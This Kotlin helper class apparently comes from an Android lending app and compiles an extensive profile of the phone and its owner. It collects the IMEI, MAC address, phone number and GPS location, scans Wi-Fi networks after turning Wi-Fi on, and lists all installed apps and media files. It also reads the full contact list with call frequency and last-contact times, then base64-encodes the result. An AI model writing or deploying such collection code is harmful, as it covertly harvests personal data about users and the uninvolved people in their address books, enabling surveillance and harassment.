package com.ecreditpal.danaflash.helper

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.hardware.input.InputManager
import android.net.wifi.WifiManager
import android.os.*
import android.os.storage.StorageManager
import android.provider.ContactsContract
import android.provider.Settings
import android.telephony.PhoneStateListener
import android.telephony.SignalStrength
import android.telephony.TelephonyManager
import android.text.TextUtils
import androidx.core.app.ActivityCompat
import com.alibaba.fastjson.JSON
import com.blankj.utilcode.util.*
import com.ecreditpal.danaflash.App
import com.ecreditpal.danaflash.data.UserFace
import com.ecreditpal.danaflash.model.DeviceInfoBean
import java.io.File
import java.util.*
import kotlin.collections.ArrayList
import kotlin.math.pow
import kotlin.math.sqrt


class DeviceInfoUtil {

    @SuppressLint("MissingPermission")
    fun getAllDeviceInfo(context: Context): String? {
        //获取hardware
        val deviceInfoBean = DeviceInfoBean()
        val hardware = DeviceInfoBean.Hardware().apply {
            device_name = Build.DEVICE
            sdk_version = Build.VERSION.SDK
            model = Build.MODEL
            release = Build.VERSION.RELEASE
            brand = Build.BRAND
            serial_number = Build.SERIAL

            val dm = context.resources.displayMetrics
            val width = dm.widthPixels
            val height = dm.heightPixels
            val x = width.toDouble().pow(2.0)
            val y = height.toDouble().pow(2.0)
            val diagonal = sqrt(x + y)
            val dens = dm.densityDpi
            val screenInches = diagonal / dens.toDouble()
            physical_size = screenInches.toString()
        }
        deviceInfoBean.hardware = hardware

        //获取storage
        val storage = DeviceInfoBean.Storage().apply {
            var size: Long
            val activityManager = context
                .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val outInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(outInfo)
            size = outInfo.totalMem
            ram_total_size = size.toString()
            size = outInfo.availMem
            ram_usable_size = size.toString()
            var memorys = getStorageInfo(context, EXTERNAL_STORAGE)
            memory_card_size_use = if (memorys.isNotEmpty()) memorys[0] else ""
            memory_card_size = if (memorys.size > 1) memorys[1] else ""
            memorys = getStorageInfo(context, INTERNAL_STORAGE)
            internal_storage_usable = if (memorys.isNotEmpty()) memorys[0] else ""
            internal_storage_total = if (memorys.size > 1) memorys[1] else ""
        }
        deviceInfoBean.storage = storage

        //general_data
        val generalData = DeviceInfoBean.General().apply {
            gaid = UserFace.gaid
            and_id = Settings.Secure.getString(App.context.contentResolver, Settings.Secure.ANDROID_ID)
            phone_type = PhoneUtils.getPhoneType().toString()
            mac = DeviceUtils.getMacAddress()
            language = Locale.getDefault().language
            locale_display_language = Locale.getDefault().displayLanguage
            locale_iso3_language = Locale.getDefault().isO3Language
            locale_iso3_country = Locale.getDefault().isO3Country
            imei = PhoneUtils.getIMEI()
            phone_number = getNativePhoneNumber(context)
            network_operator_name = NetworkUtils.getNetworkOperatorName()
            network_type = getNetworkType()
            time_zone_id = TimeZone.getDefault().id
        }
        deviceInfoBean.general_data = (generalData)

        //OtherData
        val otherData = DeviceInfoBean.Other().apply {
            root_jailbreak = if (DeviceUtils.isDeviceRooted()) "1" else "0"
            last_boot_time = SystemClock.elapsedRealtime().toString()
            val inputManager = context.getSystemService(Context.INPUT_SERVICE) as InputManager
            val devices = inputManager.inputDeviceIds
            keyboard = if (devices.isNotEmpty()) devices[0].toString() else "0"
            simulator = if (DeviceUtils.isEmulator()) "1" else "0"
            dbm = getMobileNetworkSignal(context).toString()
        }
        deviceInfoBean.other_data = (otherData)

        //appInfo
        deviceInfoBean.application = getAllAppsInfo(context)

        //network
        val networkBean = DeviceInfoBean.NetworkBean().apply {
            IP = (NetworkUtils.getIPAddress(true))
            val wifiManger = App.context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wifiInf = wifiManger.connectionInfo
            val currentWifi = DeviceInfoBean.CurrentWifi().apply {
                name = wifiInf?.ssid ?: ""
                bssid = wifiInf?.bssid ?: ""
                mac = wifiInf?.macAddress ?: ""
                ssid = wifiInf?.ssid ?: ""
            }
            current_wifi = currentWifi
            configured_wifi = getScanWifiInfo()
        }
        deviceInfoBean.network = networkBean

        //location
        val locationBean = DeviceInfoBean.LocationBean().apply {
            gps = DeviceInfoBean.GPS().apply {
                longitude = UserFace.location?.longitude?.toString() ?: ""
                latitude = UserFace.location?.latitude?.toString() ?: ""
            }
        }
        deviceInfoBean.location = locationBean

        //充电信息
        val batteryStatus = DeviceInfoBean.BatteryStatus().apply {
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val receiver = context.registerReceiver(null, filter)
            val level = receiver?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = receiver?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = level * 100 / scale.toFloat()
            battery_pct = batteryPct.toInt()
            // Are we charging / charged?
            val status = receiver?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
            is_charging = if (isCharging) 1 else 0
            // How are we charging?
            val chargePlug = receiver?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
            val usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB
            val acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC
            is_ac_charge = if (acCharge) 1 else 0
            is_usb_charge = if (usbCharge) 1 else 0
        }

        deviceInfoBean.battery_status = batteryStatus

        //Contact
        deviceInfoBean.contact = getAllContacts(context)

        //其它
        deviceInfoBean.audio_internal = FileUtil.getMusics(context, false).toString()
        deviceInfoBean.audio_external = FileUtil.getMusics(context, true).toString()
        deviceInfoBean.images_internal = FileUtil.getImages(context, false)
        deviceInfoBean.images_external = FileUtil.getImages(context, true)
        deviceInfoBean.video_internal = FileUtil.getVideos(context, false)
        deviceInfoBean.video_external = FileUtil.getVideos(context, true)
        deviceInfoBean.download_files = FileUtil.getDownload(context)
        deviceInfoBean.contact_group = FileUtil.getContacts(context)
        LogUtils.d(
            """
            设备信息：
            ${JSON.toJSONString(deviceInfoBean)}
            """.trimIndent()
        )
        return EncodeUtils.base64Encode2String(JSON.toJSONString(deviceInfoBean).toByteArray())
    }

    private val INTERNAL_STORAGE = 0
    private val EXTERNAL_STORAGE = 1

    private fun getStoragePath(context: Context, type: Int): String? {
        val sm = context
            .getSystemService(Context.STORAGE_SERVICE) as StorageManager
        try {
            val getPathsMethod = sm.javaClass.getMethod(
                "getVolumePaths"
            )
            val path = getPathsMethod.invoke(sm) as Array<String>
            when (type) {
                INTERNAL_STORAGE -> return path[type]
                EXTERNAL_STORAGE -> return if (path.size > 1) {
                    path[type]
                } else {
                    null
                }
                else -> {
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }

    private fun getStorageInfo(context: Context, type: Int): List<String?> {
        val path = getStoragePath(context, type)
        val lists: MutableList<String?> = ArrayList()
        /**
         * 无外置SD 卡判断
         */
        if (!(Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) || TextUtils.isEmpty(
                path
            ) || path == null
        ) {
            return lists
        }
        val file = File(path)
        val statFs = StatFs(file.path)
        val blockCount = statFs.blockCountLong
        val bloackSize = statFs.blockSizeLong
        val totalSpace = bloackSize * blockCount
        val availableBlocks = statFs.availableBlocksLong
        val availableSpace = availableBlocks * bloackSize
        lists.add(availableSpace.toString())
        lists.add(totalSpace.toString())
        return lists
    }

    private fun getNetworkType(): String {
        return when (NetworkUtils.getNetworkType()) {
            NetworkUtils.NetworkType.NETWORK_NO -> "none"
            NetworkUtils.NetworkType.NETWORK_WIFI -> "wifi"
            NetworkUtils.NetworkType.NETWORK_2G -> "2g"
            NetworkUtils.NetworkType.NETWORK_3G -> "3g"
            NetworkUtils.NetworkType.NETWORK_4G -> "4g"
            NetworkUtils.NetworkType.NETWORK_ETHERNET -> "eth"
            else -> "mobile"
        }
    }

    //获取电话号码
    private fun getNativePhoneNumber(context: Context): String? {
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var nativePhoneNumber: String?
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_SMS
            ) == PackageManager.PERMISSION_DENIED || ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_NUMBERS
            ) == PackageManager.PERMISSION_DENIED || ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_DENIED
        ) {
            return ""
        }
        nativePhoneNumber = telephonyManager.line1Number
        return nativePhoneNumber
    }

    private fun getMobileNetworkSignal(context: Context): Int {
        val re = intArrayOf(0)
        if (!hasSimCard(context)) {
            return re[0]
        }
        val mTelephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        mTelephonyManager.listen(object : PhoneStateListener() {
            override fun onSignalStrengthsChanged(signalStrength: SignalStrength) {
                super.onSignalStrengthsChanged(signalStrength)
                val asu = signalStrength.gsmSignalStrength
                val lastSignal = -113 + 2 * asu
                if (lastSignal > 0) {
                    re[0] = lastSignal
                }
            }
        }, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS)
        return re[0]
    }

    /**
     * 判断是否包含SIM卡
     *
     * @return 状态
     */
    private fun hasSimCard(context: Context): Boolean {
        val telMgr = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val simState = telMgr.simState
        var result = true
        when (simState) {
            TelephonyManager.SIM_STATE_ABSENT, TelephonyManager.SIM_STATE_UNKNOWN -> result =
                false // 没有SIM卡
        }
        return result
    }

    private fun getAllContacts(context: Context): List<DeviceInfoBean.Contact>? {
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED,
            ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
            ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP
        )

        val contacts: ArrayList<DeviceInfoBean.Contact> = ArrayList()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection, null, null, null
        ) ?: return emptyList()

        while (cursor.moveToNext()) {
            //新建一个联系人实例
            val temp: DeviceInfoBean.Contact = DeviceInfoBean.Contact()
            //获取联系人姓名
            val name =
                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY))
            temp.contact_display_name = name
            var phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            phone = phone.replace("-", "")
            phone = phone.replace(" ", "")
            temp.number = phone
            val time =
                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED))
            temp.last_time_contacted = (time) ?: ""
            val timeC = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED))
            temp.times_contacted = (timeC)
            val upTime =
                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
            temp.up_time = upTime

            contacts.add(temp)
        }

        cursor.close()
        return contacts
    }

    private fun getScanWifiInfo(): List<DeviceInfoBean.CurrentWifi> {
        val list: MutableList<DeviceInfoBean.CurrentWifi> = ArrayList()
        val mWifiManager = App.context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        // 如果WiFi未打开，先打开WiFi
        if (!mWifiManager.isWifiEnabled) mWifiManager.isWifiEnabled = true

        // 开始扫描WiFi
        mWifiManager.startScan()
        // 获取并保存WiFi扫描结果
        val scanResults = mWifiManager.scanResults
        for (sr in scanResults) {
            val currentWifi = DeviceInfoBean.CurrentWifi()
            currentWifi.bssid = (sr.BSSID)
            currentWifi.mac = ""
            currentWifi.ssid = sr.SSID
            currentWifi.name = sr.SSID
            list.add(currentWifi)
        }
        return list
    }

    private fun getAllAppsInfo(context: Context): List<DeviceInfoBean.AppInfo>? {
        val appInfoBeans: MutableList<DeviceInfoBean.AppInfo> = ArrayList()
        //        List<PackageInfo> apps = new ArrayList<PackageInfo>();
        val pManager = context.packageManager
        //获取手机内所有应用
        val paklist = pManager.getInstalledPackages(0)
        for (i in paklist.indices) {
            val pak = paklist[i] as PackageInfo
            //判断是否为非系统预装的应用程序
            val appInfoBean: DeviceInfoBean.AppInfo = DeviceInfoBean.AppInfo().apply {

                app_name = pManager.getApplicationLabel(pak.applicationInfo).toString()
                `package` = pak.packageName
                in_time = pak.firstInstallTime.toInt()
                app_type = if (pak.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM <= 0) {
                    0
                } else 1
                version_name = pak.versionName
                version_code = pak.versionCode
                flags = pak.applicationInfo.flags
                up_time = pak.lastUpdateTime.toInt()
            }

            appInfoBeans.add(appInfoBean)
        }
        return appInfoBeans
    }
}